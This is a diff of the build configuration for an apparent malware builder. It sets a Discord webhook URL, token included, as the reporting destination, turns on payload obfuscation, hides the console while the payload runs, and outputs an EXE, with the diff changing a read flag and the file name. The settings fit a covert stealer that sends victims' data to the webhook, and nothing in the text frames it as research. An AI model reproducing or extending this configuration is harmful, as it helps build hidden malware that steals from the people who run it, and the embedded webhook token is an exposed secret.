@@ -20,9 +20,9 @@ version = "1.0"
 webhook = "https://discord.com/api/webhooks/1335514430850601071/50AL7KFqOMpFHHkGHDNUaOIrSySXAgUpxVWR9ZpirH0m-wZbnfz_fHod-VxlBPq-OoTU" # Webhook URL
 obfuscate = True # Obfuscate the payload
 hideConsole = True # Hide the console when the payload is ran
-forceRead = False
+forceRead = True
 virtualenvir = False
-inputFileName = "Dark Client" # Input file name
+inputFileName = "compiled" # Input file name
 comboBoxFileType = "EXE" # File type
 
 def build():
